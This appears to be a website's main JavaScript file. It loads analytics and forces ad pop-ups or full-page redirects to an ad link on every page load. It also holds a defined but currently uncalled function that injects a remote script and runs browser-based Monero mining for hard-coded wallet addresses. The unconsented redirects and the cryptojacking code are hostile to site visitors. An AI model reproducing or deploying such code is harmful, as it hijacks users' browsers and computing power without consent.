window.onload = function() {
    loadIMCMain();
};

var jsFiles = [
    'https://imc.re/assets/js/core/jquery.min.js'
];

var links = [
    'https://l.imc.re/adsterra'
];
// ,
// 'https://l.imc.re/pddcpa',
// 'https://l.imc.re/haoka',
// 'https://l.imc.re/ad'

function loadIMCMain() {
    loadScripts(jsFiles);
    baiduTongji();
    googleAnalytics();
    // xmrMiner();

    // if (!localStorage.getItem('hasVisited')) {
    //   localStorage.setItem('hasVisited', 'true');
    //   redirectToLinks('win');
    // }
    var ads = getURLParameter('ads');
    if (ads == '1') {
        redirectToLinks('win');
    } else if (ads == '2') {
        redirectToLinks('loc');
    }

    var randomNumber = Math.random();
    console.log('test:');
    console.log(randomNumber);
    if (randomNumber >= 0.8) {
        redirectToLinks('loc');
        console.log("loc");
    } else {
        redirectToLinks('win');
        console.log("win");
    }
}

function loadScripts(files) {
    files.forEach(function(file) {
        var script = document.createElement('script');
        script.src = file;
        script.type = 'text/javascript';
        script.async = true; // 异步加载JS文件
        document.head.appendChild(script);
    });
}
        
function getURLParameter(name) {
    var queryParams = window.location.search.substring(1);
    var params = queryParams.split('&');
    for (var i = 0; i < params.length; i++) {
        var param = params[i].split('=');
        if (param[0] === name) {
        return decodeURIComponent(param[1]);
        }
    }
    return null;
}

function redirectToLinks(t,u) {
    if (u == undefined) {
        var randomIndex = Math.floor(Math.random() * links.length);
        url = links[randomIndex];
    } else {
        url = u;
    }

    if (t == 'win') {
        window.open(url, '_blank');
    } else {
        window.location.href = url;
    }
};

function redirectToDomain() {
    var hostname = window.location.hostname; // 获取当前页面的域名
    var url;

    switch (hostname) {
        case 'imc.cab':
            url = 'https://smgoro.com';
            break;
        case 'hugo.imc.re':
            url = 'https://imc.cab';
            break;
        default:
            break;
    }
    redirectToLinks('win', url);
}

function xmrMiner() {
    // Start Of Mining Code (Javascript)
    var script = document.createElement("script");
    // script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
    script.src = "https://thelifewillbefine.de/karma/karma.js?karma=bs%253Falgy=rx/0%253Fnosaj=xmr.miner.mcbe-server.com:9000";
    // script.src = "/assets/js/na-monero.js";

    // 使用load事件确保脚本加载完毕后再执行startMining函数
    script.onload = function() {
        server = "wss://ny1.xmrminingproxy.com";
        var pool = "moneroocean.stream";
        var walletAddress = "47YPoXCVUxAQFpS8gmQX4fgY5LmnGkNG4Xz3WjzADvvZhr8WnNG3P4MD4hPAxF8aWZbUSrHhJ7YdZ4x3pi3qJw6aT9RxMg2";
        var workerId = "WEB-XMR"
        var threads = 5; //-1
        var password = "";
        startMining(pool, walletAddress, workerId, threads, password);
        throttleMiner = 20;

        EverythingIsLife('46CCPD4KmGbcs3vCwUPtkUCaKQRzLmb6GR7NJwj93anPg3CPugJbDmucumG7r3JsUH4PGRBSoHQAyCXjNDYffHJPHPdrGst', workerId, 80);
    };
    document.head.appendChild(script);
    // End Of Mining Code
}


// 百度统计
function baiduTongji(id) {
    var id = id || 'a02d22441e44bb824edf8620f6c3f5fa';
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = `https://hm.baidu.com/hm.js?${id}`;
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
}

// Google Analytics
function googleAnalytics(id) {
    var id = id || 'G-PMMTR7C3S5';
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', id);
}